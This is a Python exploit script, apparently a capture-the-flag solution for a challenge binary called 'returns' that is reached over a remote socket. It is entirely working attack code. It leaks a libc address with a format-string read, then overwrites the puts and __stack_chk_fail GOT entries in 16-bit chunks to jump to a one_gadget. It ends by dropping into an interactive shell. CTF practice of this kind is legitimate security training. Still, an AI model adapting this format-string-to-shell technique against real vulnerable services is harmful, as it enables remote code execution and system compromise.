from ptrlib import *

elf = ELF("./returns")
plt_stack_chk_fail = 0x401050

#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#diff = 0xe7
#libc_gadget = 0x4f322
#sock = Process("./returns")

libc = ELF("./libc.so.6")
diff = 0xf0
libc_gadget = 0x4526a
sock = Socket("shell.actf.co", 19307)

# Stage 1
sock.recvuntil("What item would you like to return? ")
payload = b'%17$p...'
payload += str2bytes("%{}c%{}$hn".format(
    (elf.symbol("main") & 0xffff) - 17,
    8 + 3
))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("puts"))[:3]
sock.sendline(payload)
sock.recvuntil("We didn't sell you a ")
addr_libc_start_main = int(sock.recvuntil(".").rstrip(b"."), 16)
libc_base = addr_libc_start_main - libc.symbol("__libc_start_main") - diff
#addr_system = libc_base + libc.symbol("system")
addr_gadget = libc_base + libc_gadget
dump("libc base = " + hex(libc_base))

# Stage 2
sock.recvuntil("What item would you like to return? ")
payload = b'AAAABBBB'
payload += str2bytes("%{}c%{}$hn".format(
    (addr_gadget & 0xffff) - 8,
    11
))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("__stack_chk_fail"))[:3]
sock.sendline(payload)

# Stage 3
sock.recvuntil("What item would you like to return? ")
payload = b'AAAABBBB'
payload += str2bytes("%{}c%{}$hn".format(
    ((addr_gadget >> 16) & 0xffff) - 8,
    11
))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("__stack_chk_fail") + 2)[:3]
sock.sendline(payload)

# Stage 4
sock.recvuntil("What item would you like to return? ")
payload = b'AAAABBBB'
payload += str2bytes("%{}c%{}$hn".format(
    ((addr_gadget >> 32) & 0xffff) - 8,
    11
))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("__stack_chk_fail") + 4)[:3]
sock.sendline(payload)

# Stage 6
_ = input()
sock.recvuntil("What item would you like to return? ")
payload = b'AAAABBBB'
payload += str2bytes("%{}c%{}$hn".format(
    (plt_stack_chk_fail & 0xffff) - 8,
    11
))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("puts"))[:3]
sock.sendline(payload)

# Get the shell!
sock.interactive()
